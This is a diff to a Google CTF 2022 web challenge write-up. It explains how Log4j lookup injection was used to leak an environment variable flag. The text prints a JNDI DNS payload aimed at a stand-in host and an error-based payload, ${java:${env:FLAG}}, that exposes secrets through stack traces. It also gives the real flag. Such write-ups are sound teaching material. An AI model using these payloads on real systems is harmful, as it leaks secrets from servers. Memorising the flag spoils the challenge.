@@ -14,7 +14,7 @@ The architecture is quite straight forward. But I'll break it down quickly. The 
 
 **Please note:** that any error message you see on the web page doesn't matter as this vulnerable log code occurs before this happens
 
-## Solution
+## Solutionsc
 Start of by doing this locally as seeing the logging occur server side help quite a bit with the exploitation. To get the container running locally after downloading the file run the following command: `docker run -it --cap-add=SYS_ADMIN --read-only --security-opt seccomp=unconfined -p 127.0.0.1:1337:1337  $(docker build -q .)`
 
 In your browser, go to http://127.0.0.1:1337.
@@ -25,6 +25,7 @@ ${jndi:dns://aeutbj.example.com/ext}
  
 Observe to see that the logger doesn't execute this payload since JNDI isn't enabled within this code.  In the screenshot below I showed what the logger outputted, however, if JDNI was enabled the logger would return something similar to `Send LDAP reference result for a redirecting to http://aeutbj.example.com`.
 
+![alt text](https://raw.githubusercontent.com/bc-donfran/CTF-Writeups/main/Google%20CTF%202022/web/img/failed%20jndi.png)
 
 Since JNDI isn't enabled we aren't able to extract the flag out via a webhook which makes it a bit more hard.
 
@@ -32,13 +33,20 @@ However, this means that we only have the log4j lookup features to attempt to ge
 
 Try a basic lookup payload such as `${java:version}` and we observe in the log that the payload isn't reflected but we are able to see `Java version 11.0.15` as seen in the screenshot below.
 
+![alt_text](https://raw.githubusercontent.com/bc-donfran/CTF-Writeups/main/Google%20CTF%202022/web/img/java%20version.png)
+
 You then can try to see if we can see the flag in the log server side by injection the payload `${env:FLAG}` and we see CTF{REDACTED}.
 
 That means lookup is a success but the problem is that this isn't reflected on the webapge meaning we won't be able to see the flag. We have to force it out.
 
 After a bit of fuzzing and reading the documentation, I learnt that you can generate an error by providing an attribute that doesn't exists for a lookup. For example, if I were to submit `${java:g22}` it will show a stack trace on the webpage as seen in the screenshot below.
 
+![alt_text](https://raw.githubusercontent.com/bc-donfran/CTF-Writeups/main/Google%20CTF%202022/web/img/g22.png)
+
 I saw `java:g22` within the stack trace and got to thinking what would happen if I repalced the `g22` above with `${env:FLAG}` to produce the payload: `${java:${env:FLAG}}`. From that payload, I was able to see the `CTF{REDACTED}` as seen in the screenshot below.
 
+![alt_text](https://raw.githubusercontent.com/bc-donfran/CTF-Writeups/main/Google%20CTF%202022/web/img/local_flag.png)
 
 Submitting this into the actual challenge got me the flag `CTF{d95528534d14dc6eb6aeb81c994ce8bd}` as seen in the screenshot below.
+
+![alt_text](https://raw.githubusercontent.com/bc-donfran/CTF-Writeups/main/Google%20CTF%202022/web/img/real_flag.png)
